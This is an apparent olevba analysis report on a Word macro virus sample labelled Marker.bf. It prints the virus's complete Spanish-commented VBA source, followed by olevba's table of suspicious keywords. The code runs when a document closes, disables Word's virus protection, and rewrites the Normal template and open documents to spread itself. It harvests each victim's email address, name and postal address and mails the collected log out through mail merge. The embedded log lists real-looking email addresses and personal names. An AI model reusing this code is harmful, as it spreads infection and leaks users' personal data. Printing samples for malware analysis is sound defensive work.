olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bf-f8736c499753150a2e35af055aa07c24f131e70d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bf-f8736c499753150a2e35af055aa07c24f131e70d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marcador = "<->"

'Declarar Variables
Dim SalvarDocumento, SalvarPlantillaNormal, DocumentoInfectado, PlantillaNormalInfectada As Boolean
Dim ad, nt, ad2 As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim CorreoPredeterminado, Email, DatosFichero, ExisteFichero As String


'Inicializar Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

'Para que no se vea nada
Application.ScreenUpdating = False


DocumentoInfectado = ad.codemodule.Find(Marcador, 1, 1, 10000, 10000)
PlantillaNormalInfectada = nt.codemodule.Find(Marcador, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False

If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") <> "kk") Then

    If DocumentoInfectado = True Then
      LogData = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)
    ElseIf PlantillaNormalInfectada = True Then
      LogData = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)
    End If

    LogData = Mid(LogData, InStr(1, LogData, "'Ordenadores " & "Infectados -->") + 29, Len(LogData) - InStr(1, LogData, "'Ordenadores " & "Infectados -->") + 29)

    LogFile = "C:\Scan8328" & ".sys"
    DatosFichero = ""
    For i = 1 To Len(LogData)
        If Mid(LogData, i, 1) <> "'" Then
            DatosFichero = DatosFichero & Mid(LogData, i, 1)
        End If
    Next
    
    Open LogFile For Output As #1
    Print #1, DatosFichero
    Close #1

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = "kk"

End If

'Por Seguridad
If (DocumentoInfectado = True Xor PlantillaNormalInfectada = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
   'Infectar la Plantilla Normal
   If DocumentoInfectado = True Then
  
     SalvarPlantillaNormal = NormalTemplate.Saved
  
     OurCode = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)

    
     'Escribir los datos de la nueva Infección

     CorreoPredeterminado = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager", "Default Mail Account")
     Email = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\" & CorreoPredeterminado, "SMTP Email Address")
     
     For i = 1 To Len(Application.UserAddress)
       If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
         If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
           UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
         End If
       End If
     Next i
     
     
     
     OurCode = OurCode & Chr(13) & _
              "'" & "Hello From;" & Email & ";" & _
              Format(Time, "hh:mm:ss AMPM - ") & _
              Format(Date, "dddd, d mmm yyyy") & ";" & _
              Application.UserName & " | " & UserAddress




     nt.codemodule.DeleteLines 1, nt.codemodule.CountOfLines
     nt.codemodule.AddFromString OurCode
   
     'If SalvarPlantillaNormal = True Then
     '   NormalTemplate.Save
     'End If
     
     If NormalTemplate.Saved = False Then
        NormalTemplate.Save
        PlantillaNormalInfectada = False
     End If
  End If

  'Infectar el documento activo
  If PlantillaNormalInfectada = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
     If ActiveDocument.MailMerge.DataSource.Name <> "C:\scan8328.sys" Then
       SalvarDocumento = ActiveDocument.Saved
    
       OurCode = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)
    
       ad.codemodule.DeleteLines 1, ad.codemodule.CountOfLines
       ad.codemodule.AddFromString OurCode
    
       'If SalvarDocumento = True Then ActiveDocument.Save
       If ActiveDocument.Saved = False Then ActiveDocument.Save
     End If
  End If
 
  
   
End If
ExisteFichero = ""
ExisteFichero = Dir("c:\scan8328.sys")

If ExisteFichero <> "" And _
    ActiveDocument <> NormalTemplate.Name And _
    ActiveDocument.MailMerge.DataSource.Name <> "C:\scan8328.sys" Then
    'Comenzamos el envio de e-mailssssss.... : - )))
    
    Documents.Add
    Set ad2 = ActiveDocument.VBProject.VBComponents.Item(1)
    If ad2.codemodule.CountOfLines > 0 Then
        ad2.codemodule.DeleteLines 1, ad2.codemodule.CountOfLines
    End If
    ActiveDocument.MailMerge.MainDocumentType = wdFormLetters
    ActiveDocument.MailMerge.OpenDataSource "C:\scan8328.sys", Format:=wdOpenFormatText
    ActiveDocument.MailMerge.Destination = wdSendToEmail
    ActiveDocument.GoTo What:=wdGoToLine, Which:=wdGoToLast
    
    ActiveDocument.MailMerge.MailAddressFieldName = "correo"
    ActiveDocument.MailMerge.MailSubject = "Good Morning Torpedo ......."
    Set posicion = ActiveDocument.Content
    posicion.Font.ColorIndex = wdWhite
    posicion.InsertAfter Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13)
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Saludo"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Correo"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="FechaHora"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Usuario"
   
    ActiveDocument.MailMerge.Execute

End If

For i = 0 To Documents.Count - 1
    Documents(i).Activate
    ActiveDocument.Close wdDotNotSaveChanges
Next

Application.ScreenUpdating = True

End Sub

'Ordenadores Infectados -->
'Saludo;Correo;FechaHora;Usuario
'Hello From;consultas@ aeat.es;10:00;Grijander
'Hello From;patrimonio@ tsai.es;11:00;Grijander
'Hello From;infopyme@ ipyme.org;12:00;Grijander
'Hello From;infotur.spain@ tourspain.es;13:00;Grijander
'Hello From;web@ief.es;14:00;Grijander
'Hello From;info@ine.es;15:00;Grijander
'Hello From;luisps4@latinmail.com;04:01:20  - martes, 17 ago 1999;Luisa Fernanda Piñeiro Sanz
'Hello From;aramis@icm.csic.es;04:10:23  - martes, 2 nov 1999;Aramis |


'Hello From;zxczxc@sdfh.com;06:38:06 PM - Monday, 29 Nov 1999;Avert |


'Hello From;pal.mike@usa.net;07:47:00  - âîñêðåñåíüå, 26 äåê 1999;Lucky Warrior | Bgy. Tiguib, O.E.S.


'Hello From;;05:45:01 PM - Monday, 20 Dec 1999;Ditry PC |


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
